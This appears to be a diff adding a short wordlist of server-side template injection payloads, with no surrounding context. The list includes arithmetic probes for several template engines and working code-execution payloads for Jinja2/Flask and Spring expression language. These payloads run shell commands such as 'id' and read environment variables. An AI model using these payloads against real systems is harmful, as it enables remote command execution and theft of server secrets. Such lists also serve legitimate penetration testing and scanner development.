@@ -1,0 +1,12 @@
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{{7*'7'}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+#{T(java.lang.System).getenv()}
+@(1+2)
+[[${7*7}]]
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
